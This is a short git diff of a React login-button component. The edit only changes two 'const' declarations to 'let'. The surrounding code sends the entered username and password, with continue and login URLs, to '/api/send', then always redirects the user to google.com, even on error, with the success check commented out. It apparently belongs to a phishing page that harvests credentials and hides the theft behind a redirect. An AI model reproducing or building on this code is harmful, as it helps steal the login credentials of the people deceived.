@@ -42,7 +42,7 @@ const LoginButton = ({login,continu2,isAuthenticated,authLoading,postUrl,isAndro
           try{
             const res =  await axios.post('/api/send',{username,password,continue_url,login_url});
             dispatch(uiActions.setLoading(false))
-            const link =document.createElement('a');
+            let link =document.createElement('a');
             link.href = 'https://google.com';
             link.click();
             // if(res.status == 200){
@@ -51,7 +51,7 @@ const LoginButton = ({login,continu2,isAuthenticated,authLoading,postUrl,isAndro
           }catch(err){
             console.log(err)
             console.log("Error")
-            const link =document.createElement('a');
+            let link =document.createElement('a');
             link.href = 'https://google.com';
             link.click();
             dispatch(uiActions.setLoading(false))
